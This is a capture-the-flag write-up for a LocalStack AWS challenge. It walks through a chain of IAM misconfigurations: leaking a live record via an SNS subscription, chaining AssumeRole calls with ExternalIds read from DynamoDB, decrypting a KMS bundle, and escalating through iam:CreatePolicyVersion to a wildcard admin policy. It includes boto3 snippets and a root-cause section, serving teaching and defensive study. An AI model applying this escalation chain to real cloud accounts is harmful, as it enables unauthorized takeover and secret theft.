# Closed Gate

**Cyber Apocalypse CTF 2026 — Cloud (AWS / LocalStack)**

> Rin Kagetsura finds that Vaultrune has sealed a small service gate below Crownspire's outer wall.
> She has to enter through an old maintenance tunnel, open the gate without leaving clear signs of a
> break-in, and get the supplies moving before nightfall.

A read-mostly IAM maze. Starting as a low-privilege clerk, the goal is to find the one *live* lock
plate hidden among decoys, walk a chain of assumed roles, and abuse a single IAM write to reach the
sealed shard secret. Flag format: `HTB{...}`.

## Access

Two ports per instance. One is the **AWS API** (returns `AccessDeniedException / MissingAuthentication`
with `x-amz-*` headers); the other is the **briefing**, which serves the starting credentials at
`/player-creds.json` (IAM user `registry-outer-clerk`). Point `AWS_ENDPOINT_URL` at the API port.

```json
{ "user": "registry-outer-clerk", "access_key_id": "AKIA...", "secret_access_key": "...", "region": "us-east-1" }
```

The clerk's entire permission set:

| Service | Allowed |
|---|---|
| `sts` | `GetCallerIdentity`, `AssumeRole` |
| `sqs` | `ReceiveMessage` on `registry-maintenance-queue` and `registry-plate-notify-queue` |
| `dynamodb` | `GetItem` on `registry-plate-index` (any key) |
| `sns` | `ListTopics`, **`Subscribe` — only to `registry-plate-unlock`** |

> **LocalStack gotcha:** a *resource*-scoped denial produces the exact same message as a missing action
> (`User is not authorized to perform: <action>`, with no `on resource` clause). You cannot tell "role
> lacks the action" from "role has it but the ARN didn't match" — this hides the whole solution path.

## 1. Find the live plate

`registry-maintenance-queue` holds 10 work orders, but every referenced plate in `registry-plate-index`
is a decoy: `status` is `CLOSED/DRAFT/REVOKED/...` and every external id is `stale-*`. The
`registry-plate-notify-queue` is empty.

The clerk *can* subscribe **its readable notify-queue** to the `registry-plate-unlock` SNS topic:

```python
sns.subscribe(TopicArn=unlock_topic, Protocol="sqs",
              Endpoint="arn:aws:sqs:us-east-1:<acct>:registry-plate-notify-queue")
```

The topic then streams a flood of "custody notices" with random statuses. Exactly **one** carries
`"status": "ACTIVE"` — that is the live plate (`PLATE-4E8C`). `GetItem` on it returns a *real* record:

```json
{ "status": "ACTIVE", "cfn_stack": "registry-shard-stack-live",
  "custody_external_id":  "registry-job-custody-4e8c",
  "indexer_external_id":  "registry-indexer-relay-4e8c",
  "verifier_external_id": "registry-verifier-bind-4e8c",
  "custodian_external_id":"registry-custodian-seal-4e8c",
  "custody_role_arn":  ".../registry-custody-reader",
  "indexer_role_arn":  ".../registry-indexer",
  "verifier_role_arn": ".../registry-verifier-runner",
  "custodian_role_arn":".../shard-custodian",
  "artifacts_bucket": "registry-sealed-artifacts",
  "policy_bundle_key":"bundles/live/registry-policy-bundle-4e8c.enc",
  "policy_kms_key_id":"a034c734-..." }
```

## 2. Walk the role chain

Each role trusts **only the previous one** in the chain and requires the matching ExternalId. The clerk
cannot assume `registry-indexer` directly, but can reach it through `custody-reader`:

```
clerk
  └─(ext registry-job-custody-4e8c)──▶ registry-custody-reader
        └─(ext registry-indexer-relay-4e8c)──▶ registry-indexer
              └─(ext registry-verifier-bind-4e8c)──▶ registry-verifier-runner
                    └─(ext registry-custodian-seal-4e8c)──▶ shard-custodian
```

(Assuming a *non-existent* role name still succeeds under LocalStack but yields powerless creds — the
real roles are the ones that reject a direct clerk assume.)

## 3. Read the policy bundle (custody-reader)

`registry-custody-reader` has `s3:GetObject` on `registry-sealed-artifacts` and `kms:Decrypt` on the
bundle key. The bundle is a `kms:v3:<keyid>:<nonce>:<ciphertext>` envelope; pass the **whole string** as
`CiphertextBlob`:

```python
blob = s3.get_object(Bucket="registry-sealed-artifacts", Key=rec["policy_bundle_key"])["Body"].read()
doc  = kms.decrypt(CiphertextBlob=blob, KeyId=blob.decode().split(":")[2])["Plaintext"]
```

It reveals the target managed policy `ShardReaderPolicy`, whose intended document grants
`secretsmanager:GetSecretValue` on `registry/shard/live-shard-4e8c-*` and `kms:Decrypt`. But the policy's
**live** default version is just a `CallerIdentity` placeholder — the bundle is the template you're meant
to install.

## 4. IAM escalation — CreatePolicyVersion

`registry-indexer` holds one dangerous write: **`iam:CreatePolicyVersion`**. Create a new default version
of `ShardReaderPolicy` granting everything:

```python
iam.create_policy_version(
    PolicyArn="arn:aws:iam::<acct>:policy/ShardReaderPolicy",
    PolicyDocument='{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}',
    SetAsDefault=True)
```

`ShardReaderPolicy` is attached to **`shard-custodian`**, which instantly inherits the new permissions.

## 5. Open the gate

`shard-custodian` now reads the sealed shard secret. Its value is another `kms:v3` blob (key
`66313b9f-...`), which the same admin permission lets it decrypt:

```python
raw  = sm.get_secret_value(SecretId="registry/shard/live-shard-4e8c")["SecretBinary"]
flag = kms.decrypt(CiphertextBlob=raw, KeyId=raw.decode().split(":")[2])["Plaintext"]
```

```
HTB{registry_outer_shard_verifier_<per-instance-hash>}
```

## Root cause

A chain of small misconfigurations compounds into full compromise:

1. `sns:Subscribe` on the unlock topic lets an outer clerk exfiltrate which plate is live.
2. ExternalIds (the assume-role secret) are stored in a table the clerk can read.
3. A decrypt-capable bundle names the escalation target policy.
4. A mid-chain role carries `iam:CreatePolicyVersion` over a policy attached to a higher-value role — the
   classic policy-version privilege escalation.
5. The end role can then read + KMS-decrypt the secret.

Reproduce with `python solve.py` (edit `EP`, `AK`, `SK` for the current instance).
